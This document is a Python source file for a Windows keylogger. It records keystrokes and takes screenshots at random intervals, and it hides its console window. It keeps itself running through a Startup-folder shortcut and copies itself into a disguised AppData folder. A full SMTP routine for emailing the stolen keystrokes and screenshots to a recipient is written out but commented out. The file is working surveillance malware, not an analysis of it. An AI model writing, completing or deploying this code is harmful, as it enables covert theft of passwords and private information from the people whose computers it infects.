import os
import time
import random
import shutil
import pyautogui
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import win32gui
import win32con
import win32com.client

# Configuration for email exfiltration
# EMAIL_ADDRESS = 'your_email@example.com'
# EMAIL_PASSWORD = 'your_email_password'
# RECIPIENT_EMAIL = 'recipient_email@example.com'
# SMTP_SERVER = 'smtp.example.com'
# SMTP_PORT = 587

# Keystroke log
keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        if key == key.space:
            keystrokes.append(' ')
        elif key == key.enter:
            keystrokes.append('\n')
        else:
            keystrokes.append(str(key))

# def send_email(subject, body, attachment_path=None):
#     msg = MIMEMultipart()
#     msg['From'] = EMAIL_ADDRESS
#     msg['To'] = RECIPIENT_EMAIL
#     msg['Subject'] = subject
#     msg.attach(MIMEText(body, 'plain'))
#
#     if attachment_path:
#         with open(attachment_path, "rb") as attachment:
#             part = MIMEBase('application', 'octet-stream')
#             part.set_payload(attachment.read())
#             encoders.encode_base64(part)
#             part.add_header(
#                 'Content-Disposition',
#                 f'attachment; filename= {os.path.basename(attachment_path)}',
#             )
#             msg.attach(part)
#
#     server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
#     server.starttls()
#     server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
#     text = msg.as_string()
#     server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
#     server.quit()

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

def random_delay():
    time.sleep(random.uniform(30, 120))  # Random delay between 30 to 120 seconds

def hide_console():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

def auto_start():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = os.path.join(startup_path, 'keylogger.lnk')
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = os.path.abspath(__file__)
    shortcut.save()

def auto_copy():
    appdata_path = os.path.join(os.getenv('APPDATA'), 'roaming', 'wpdnse')
    os.makedirs(appdata_path, exist_ok=True)
    shutil.copyfile(__file__, os.path.join(appdata_path, 'keylogger.py'))

def write_to_file(data, filename='keylogs.txt'):
    with open(filename, 'a') as file:
        file.write(data + '\n')

if __name__ == "__main__":
    hide_console()
    auto_start()
    auto_copy()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        random_delay()
        screenshot_path = take_screenshot()
        write_to_file(''.join(keystrokes))
        # send_email('Keylogger Data', ''.join(keystrokes), screenshot_path)
        keystrokes.clear()

